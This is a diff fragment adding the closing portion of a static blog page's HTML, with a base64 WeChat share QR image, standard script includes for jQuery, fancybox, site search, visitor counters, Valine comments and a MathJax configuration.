+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrElEQVR42u3aQW4cMQwEQP//0841gbPjblE0NkHtKZjsyCoZkOimPj7iz+eXz9fnvz/JR3j1na+jvXrrwgcPDw9vPPVnxhkgef4MeJ7PyxHw8PDw1njJcMmPOVu45/m0xw8eHh7ev8tLkO0C4eHh4f0fvGd2NImShIeHh/cOvLzwjSKAMj5Iiuz1rAUPDw8v5uVdpPf590p/Dw8PD2/cVU9igjZsbb/THi1/vIWHh4e3wMs33PZCQF4Qz69qfTMfPDw8vKu8JHg9OxLO3j2LOV7+Lx4eHt4a71bjqiW1RXb7BA8PD2+Dd0Ztt++2FG7bYxESDw8P7yqvbdWfFbjzZWrHx8PDw9vmJQ2nedCQL1byc6PDAw8PD2+Bd2sXzQvidvzkkIhGwMPDw/sRXhs05JelJsX32Zzx8PDw9nhtYNpS83ZaHjcXL+Ph4eFd5bUhb974T7bvZDmSaOPw94mHh4dX8iYXm/IyeoKfXE3Aw8PD2+C1hfJZ6dzGDXkDLDrx8PDw8Ma8ttWUrNO8GXY2t7+A8fDw8BZ4Z5vv2YaeL1Oy9ReLhYeHh7fMe2ZshK1tGV0vGR4eHt4arw1hz0res2sBo0tXeHh4eFd5Sbl8FjHkkz7DRzExHh4e3gLvblNq0hjLg4/6MgEeHh7eGu9sy67vJpRxRl6+v/wOHh4e3jIvvwQwb4NN8EUIgoeHh7fMy0veyTWpdskmUQUeHh7eXd5n+clb+2cLcXb8vPzF4OHh4S3wbpW5+QHTNtUmY+Lh4eHt8eZDJ42ree1/WILj4eHhrfGS+GDSXcoPg7Ys/qZkx8PDw3sD3tnVqHa7b+OGawcDHh4e3nLN+RxV5JPOw9n6IMHDw8Nb4yUvJ0/yJlkb5ubBBx4eHt4278If/OVhMIl32+XDw8PDu8r7BQJ55Cle2IcLAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
